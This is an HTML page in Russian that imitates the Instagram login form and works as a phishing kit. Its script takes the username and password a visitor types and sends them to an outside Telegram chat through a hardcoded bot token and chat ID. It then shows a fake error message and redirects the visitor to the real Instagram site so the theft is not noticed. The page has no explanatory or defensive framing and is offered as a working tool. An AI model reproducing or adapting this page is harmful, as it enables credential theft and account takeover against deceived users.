<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            border: 1px solid #dbdbdb;
            background-color: white;
            padding: 20px 40px;
            text-align: center;
            border-radius: 1px;
            width: 300px;
        }
        input {
            width: 100%;
            padding: 9px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            background-color: #fafafa;
            border-radius: 3px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 7px;
            margin: 10px 0;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover {
            background-color: #0077c2;
        }
        .footer {
            margin-top: 20px;
            color: #8e8e8e;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>Instagram</h1>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Телефон или имя пользователя" required>
            <input type="password" id="password" placeholder="Пароль" required>
            <button type="submit">Войти</button>
        </form>
        <div class="footer">
            <p>Meta © 2024</p>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const botToken = '8166822856:AAGj3O1vqQWOnWdalm2UXeiSvnPMimcvlzk';
            const chatId = '698223590';
            const message = Новые данные:\nЛогин: ${username}\nПароль: ${password};

            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
                alert('Ошибка входа. Попробуйте позже.');
                window.location.href = 'https://instagram.com';
            } catch (error) {
                alert('Ошибка сети. Попробуйте снова.');
            }
        });
    </script>
</body>
</html>
